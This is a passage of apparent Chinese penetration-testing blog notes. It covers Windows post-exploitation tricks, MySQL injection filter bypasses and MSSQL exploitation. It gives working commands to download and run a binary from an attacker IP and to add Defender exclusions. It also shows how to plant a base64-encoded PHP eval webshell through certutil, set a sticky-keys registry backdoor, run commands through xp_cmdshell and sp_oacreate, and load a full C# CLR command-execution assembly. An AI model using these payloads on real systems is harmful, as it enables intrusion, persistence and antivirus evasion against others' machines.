SetAllowTSConnections 1# 关闭wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h1 id="锁屏"><a href="#锁屏" class="headerlink" title="锁屏"></a>锁屏</h1><pre class="language-none"><code class="language-none">Rundll32.exe user32.dll，LockWorkStation</code></pre><h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><pre class="language-none"><code class="language-none">certutil.exe -urlcache -split -f [URL] output.file# base64解码certutil.exe -decode encode.file decode.file</code></pre><h1 id="查询-defender-白名单路径"><a href="#查询-defender-白名单路径" class="headerlink" title="查询 defender 白名单路径"></a>查询 defender 白名单路径</h1><pre class="language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\windows Defender\Exclusions\Paths&quot;</code></pre><h1 id="修改-defender-白名单"><a href="#修改-defender-白名单" class="headerlink" title="修改 defender 白名单"></a>修改 defender 白名单</h1><pre class="language-none"><code class="language-none">Add-MpPreference -ExclusionPath &quot;C:\Utils&quot; # 添加白名单路径Add-MpPreference -ExclusionExtension &quot;C:\Utils\veil.exe&quot; # 添加白名单程序</code></pre><h1 id="PowerShell-下载远程文件"><a href="#PowerShell-下载远程文件" class="headerlink" title="PowerShell 下载远程文件"></a>PowerShell 下载远程文件</h1><pre class="language-none"><code class="language-none">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8000&#x2F;win.exe&#39;,&#39;C:\win.exe&#39;)</code></pre><h1 id="替换文件中部分内容并写入到原文件"><a href="#替换文件中部分内容并写入到原文件" class="headerlink" title="替换文件中部分内容并写入到原文件"></a>替换文件中部分内容并写入到原文件</h1><pre class="language-none"><code class="language-none">powershell ((cat C:\Users\administrator\Desktop\info.txt) -replace &#39;somethings&#39;, &#39;anothor things&#39;) | set-content -path C:\Users\administrator\Desktop\info.txt</code></pre><h1 id="PowerShell-中使用其他用户身份执行命令"><a href="#PowerShell-中使用其他用户身份执行命令" class="headerlink" title="PowerShell 中使用其他用户身份执行命令"></a>PowerShell 中使用其他用户身份执行命令</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$passwd</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"PASSWORD"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token punctuation">(</span><span class="token string">"DOMAIN\USERNAME"</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token comment"># 执行命令</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>computername localhost <span class="token punctuation">[</span><span class="token operator">-</span>ConfigurationName dc_manage<span class="token punctuation">]</span> <span class="token operator">-</span>credential <span class="token variable">$cred</span> <span class="token operator">-</span>command <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName localhost <span class="token operator">-</span>Credential <span class="token variable">$cred</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span></code></pre><h1 id="查找指定文件"><a href="#查找指定文件" class="headerlink" title="查找指定文件"></a>查找指定文件</h1><p>递归查询 C 盘下 index.html 文件路径</p><pre class="language-none"><code class="language-none">dir &#x2F;s &#x2F;b c:\index.html</code></pre><p>对无回显 RCE 的 web 机器可以通过配合该命令将命令执行结果写入到文件中，达到半回显效果</p><p>写入命令执行结果</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&quot;dir &#x2F;s &#x2F;b c:\index.html&quot;) do (whoami &gt; %i\..\whoami.txt)</code></pre><p>写入一句话马</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\1.jpg&#39;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA&#x2F;Pgo&#x3D; &gt; %i\..\base64.txt)for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\base64.txt&#39;) do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL 关键字过滤 Bypass</title>
      <link href="/posts/53b8e68.html"/>
      <url>/posts/53b8e68.html</url>
      
        <content type="html"><![CDATA[<h1 id="过滤-information-schema"><a href="#过滤-information-schema" class="headerlink" title="过滤 information_schema"></a>过滤 information_schema</h1><p>在 mysql 5.7 中新增了 sys.schema,基础数据来自于 performance_chema 和 information_schema 两个库，本身数据库不存储数据</p><h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>存在自增字段时可以使用 <code>sys.schema_auto_increment_columns</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_auto_increment_columns <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>没有自增字段时可以使用 <code>sys.schema_table_statistics_with_buffer</code> 获取表名</p><pre class="language-sql" data-language="sql"><code class="language-sql">elect table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h2><p>使用 <code>join .. using</code> 获取字段名</p><p><code>select * from (select * from users as a join users as b)as c;</code></p><p>报错中可以得到第一个字段名</p><p><code>ERROR 1060 (42S21): Duplicate column name &#39;uid&#39;</code></p><p>将 <code>uid</code> 加入到 using 中</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>MYSQL 版本大于 5.7，root 权限</p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p>使用子查询可以在不知道列名的情况下获取数据</p><p>注意点</p><ul><li>要查询的列需要用 `` 来包裹</li><li>需要知道表中有多少列</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># admin 表存在</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># ` 被过滤时使用别名代替</span><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># 查询多列</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></code></pre><h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><ul><li>使用注释绕过，<code>/**/</code>，<code>/*!*/</code></li><li>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 <code>()</code> 包围，并且两端可以没有多余的空格</li><li>使用其他空白符替代空格，<code>%20%09%0d %0b %0c %0d %a0%0a</code></li></ul><h1 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h1><p>使用 join 绕过</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span></code></pre><p>limit 的另一种写法：<code>limit M offset N</code>，等价于 <code>limit M, N</code></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/">https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL 一般利用方式</title>
      <link href="/posts/5beaca16.html"/>
      <url>/posts/5beaca16.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL Server 是 Microsoft 开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的 DBMS 之一。SQL Server 具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等</p><p>在 2017 版之前，SQL Server 仅适用于 Windows。 SQL Server 2017 中最大的变化之一是，它现在可在 Linux 和 Docker 容器上使用。 这意味着可以在 Mac 上运行 SQL Server</p><h1 id="危险的存储过程"><a href="#危险的存储过程" class="headerlink" title="危险的存储过程"></a>危险的存储过程</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="查询-xp-cmdshell-存储过程是否存在"><a href="#查询-xp-cmdshell-存储过程是否存在" class="headerlink" title="查询 xp_cmdshell 存储过程是否存在"></a>查询 xp_cmdshell 存储过程是否存在</h3><p>xtype 为对象类型，xtype&#x3D;’x’，表示存储过程的对象类型为扩展存储过程</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span> <span class="token comment"># 存在则返回 1</span></code></pre><h3 id="xp-cmdshell-的开启与关闭"><a href="#xp-cmdshell-的开启与关闭" class="headerlink" title="xp_cmdshell 的开启与关闭"></a>xp_cmdshell 的开启与关闭</h3><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><h3 id="恢复-xp-cmdshell-存储过程"><a href="#恢复-xp-cmdshell-存储过程" class="headerlink" title="恢复 xp_cmdshell 存储过程"></a>恢复 xp_cmdshell 存储过程</h3><p>Error Message: 未能找到存储过程 ‘master..xp_cmdshell’，即 xp_cmdshell 被删除，恢复方式如下</p><p>第一步删除</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_addextendedproc<span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_oacreate<span class="token keyword">exec</span> sp_dropextendedproc <span class="token string">'xp_cmdshell'</span></code></pre><p>第二步恢复</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"sp_oacreate"</span><span class="token punctuation">,</span><span class="token string">"odsole70.dll"</span><span class="token punctuation">)</span><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><p>上传 xplog70.dll，恢复扩展存储过过程 xp_cmdshell</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">"xplog70.dll"</span><span class="token punctuation">)</span></code></pre><h2 id="注册表相关操作"><a href="#注册表相关操作" class="headerlink" title="注册表相关操作"></a>注册表相关操作</h2><p>SQL Server 存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring 等</p><h3 id="xp-regread-读注册表"><a href="#xp-regread-读注册表" class="headerlink" title="xp_regread 读注册表"></a>xp_regread 读注册表</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regread <span class="token string">'HKEY_current_user'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span><span class="token punctuation">,</span><span class="token string">'sCountry'</span><span class="token comment"># exec xp_regread [键], [子键], [键值]</span><span class="token keyword">exec</span> xp_regread N<span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> N<span class="token string">'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span> <span class="token comment"># 判断子健是否存在</span></code></pre><h3 id="xp-regaddmultistring-枚举可用的注册表键值"><a href="#xp-regaddmultistring-枚举可用的注册表键值" class="headerlink" title="xp_regaddmultistring 枚举可用的注册表键值"></a>xp_regaddmultistring 枚举可用的注册表键值</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regenumkeys <span class="token string">'HKEY_CURRENT_USER'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span></code></pre><h3 id="xp-regwrite-修改注册表"><a href="#xp-regwrite-修改注册表" class="headerlink" title="xp_regwrite 修改注册表"></a>xp_regwrite 修改注册表</h3><p>查看 xp_regwrite 是否启用</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_regwrite'</span></code></pre><p>开启 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span></code></pre><p>关闭 xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">RECONFIGURE</span></code></pre><p>修改注册表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_regwrite <span class="token variable">@rootkey</span><span class="token operator">=</span><span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token variable">@key</span><span class="token operator">=</span><span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span><span class="token punctuation">,</span><span class="token variable">@value_name</span><span class="token operator">=</span><span class="token string">'Debugger'</span><span class="token punctuation">,</span><span class="token variable">@type</span><span class="token operator">=</span><span class="token string">'REG_SZ'</span><span class="token punctuation">,</span><span class="token variable">@value</span><span class="token operator">=</span><span class="token string">'c:\windows\system32\cmd.exe'</span><span class="token comment"># 修改粘滞键的键值</span></code></pre><h3 id="xp-regdeletekey-删除指定注册表键值对"><a href="#xp-regdeletekey-删除指定注册表键值对" class="headerlink" title="xp_regdeletekey 删除指定注册表键值对"></a>xp_regdeletekey 删除指定注册表键值对</h3><p>删除粘滞键的键值</p><pre class="language-sql" data-language="sql"><code class="language-sql">xp_regdeletekey <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> <span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span></code></pre><h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>判读文件是否存在，第一列返回 0 表示文件不存在，返回 1 表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_fileexist <span class="token string">'C:\Users\MSSQLSERVER\1.txt'</span></code></pre><h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>列出当前目录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_subdirs <span class="token string">"C:\\"</span></code></pre><h2 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h2><p>获取服务器名称</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_getnetname</code></pre><h2 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h2><p>获取服务器信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_msver</code></pre><h1 id="SQL-Server-COM-组件"><a href="#SQL-Server-COM-组件" class="headerlink" title="SQL Server COM 组件"></a>SQL Server COM 组件</h1><p>SQL Server 中的 COM 组件 SP_OACREATE，执行系统命令，但是此利用方法无回显</p><h2 id="查询-SP-OACREATE-是否存在"><a href="#查询-SP-OACREATE-是否存在" class="headerlink" title="查询 SP_OACREATE 是否存在"></a>查询 SP_OACREATE 是否存在</h2><p>返回 1 则存在</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'SP_OACREATE'</span></code></pre><h2 id="SP-OACREATE-的开启与关闭"><a href="#SP-OACREATE-的开启与关闭" class="headerlink" title="SP_OACREATE 的开启与关闭"></a>SP_OACREATE 的开启与关闭</h2><p>开启</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><p>关闭</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'C:\Windows\System32\cmd.exe /c whoami /all > C:\\Users\\MSSQLSERVER\\test.txt'</span></code></pre><h1 id="SQL-Server-CLR-相关利用"><a href="#SQL-Server-CLR-相关利用" class="headerlink" title="SQL Server CLR 相关利用"></a>SQL Server CLR 相关利用</h1><p>公共语言运行时 (CLR) 集成编程概念<br>从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p><p>CLR 方式可以利用 16 进制文件流方式导入 DLL 文件，不需要文件落地</p><p>利用步骤</p><ol><li>编写 CLR</li><li>启用 MSSQL CLR 功能</li><li>利用 SQL 语句导入程序集</li><li>执行系统命令</li></ol><h2 id="编写-CLR"><a href="#编写-CLR" class="headerlink" title="编写 CLR"></a>编写 CLR</h2><p>使用 Visual Studio 创建工程</p><p><img src="/posts/5beaca16/image-20220320205141716.png" alt="image-20220320205141716"></p><p>修改目标平台和勾选创建脚本，这里是 SQL Server 2014</p><p><img src="/posts/5beaca16/image-20220320205354905.png" alt="image-20220320205354905"></p><p>修改目标框架和权限级别为 UNSAFE</p><p><img src="/posts/5beaca16/image-20220320205406216.png" alt="image-20220320205406216"></p><blockquote><p>在 SQL Server 2005 中引入了从 MSSQL 运行.NET 代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net 程序集时，会给它们指定一个权限级别<br>其权限集有三个选项</p><blockquote><p>SAFE：基本上只将 MSSQL 数据集暴露给代码，其他大部分操作则都被禁止<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码<br>UNSAFE：允许使用任何代码</p></blockquote></blockquote><p>创建 SQL CLR C# 存储过程</p><p><img src="/posts/5beaca16/image-20220320205413749.png" alt="image-20220320205413749"></p><p>代码如下</p><pre class="language-c#" data-language="c#"><code class="language-c#">using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using System.Diagnostics;using System.Text;using Microsoft.SqlServer.Server;public partial class StoredProcedures&#123;    [Microsoft.SqlServer.Server.SqlProcedure]    public static void ExecCommand (string cmd)    &#123;        &#x2F;&#x2F; 在此处放置代码        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));    &#125;    public static string RunCommand(string filename,string arguments)    &#123;        var process &#x3D; new Process();        process.StartInfo.FileName &#x3D; filename;        if (!string.IsNullOrEmpty(arguments))        &#123;            process.StartInfo.Arguments &#x3D; arguments;        &#125;        process.StartInfo.CreateNoWindow &#x3D; true;        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;        process.StartInfo.UseShellExecute &#x3D; false;        process.StartInfo.RedirectStandardError &#x3D; true;        process.StartInfo.RedirectStandardOutput &#x3D; true;        var stdOutput &#x3D; new StringBuilder();        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt; stdOutput.AppendLine(args.Data);        string stdError &#x3D; null;        try        &#123;            process.Start();            process.BeginOutputReadLine();            stdError &#x3D; process.StandardError.ReadToEnd();            process.WaitForExit();        &#125;        catch (Exception e)        &#123;            SqlContext.Pipe.Send(e.Message);        &#125;        if (process.ExitCode &#x3D;&#x3D; 0)        &#123;            SqlContext.Pipe.Send(stdOutput.ToString());        &#125;        else        &#123;            var message &#x3D; new StringBuilder();            if (!string.IsNullOrEmpty(stdError))            &#123;                message.AppendLine(stdError);            &#125;            if (stdOutput.Length !&#x3D; 0)            &#123;                message.AppendLine(&quot;Std output:&quot;);                message.AppendLine(stdOutput.ToString());            &#125;            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code &#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);        &#125;        return stdOutput.ToString();    &#125;&#125;</code></pre><p>编译生成 DLL</p><p><img src="/posts/5beaca16/image-20220320205430338.png" alt="image-20220320205430338"></p><h2 id="启用-CLR"><a href="#启用-CLR" class="headerlink" title="启用 CLR"></a>启用 CLR</h2><h3 id="SQL-Server-2017-版本之前"><a href="#SQL-Server-2017-版本之前" class="headerlink" title="SQL Server 2017 版本之前"></a>SQL Server 2017 版本之前</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 显示高级选项</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- 启用CLR</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span> <span class="token comment">-- 将存储.Net程序集的数据库配置为可信赖的</span></code></pre><h3 id="SQL-Server-2017-版本及之后"><a href="#SQL-Server-2017-版本及之后" class="headerlink" title="SQL Server 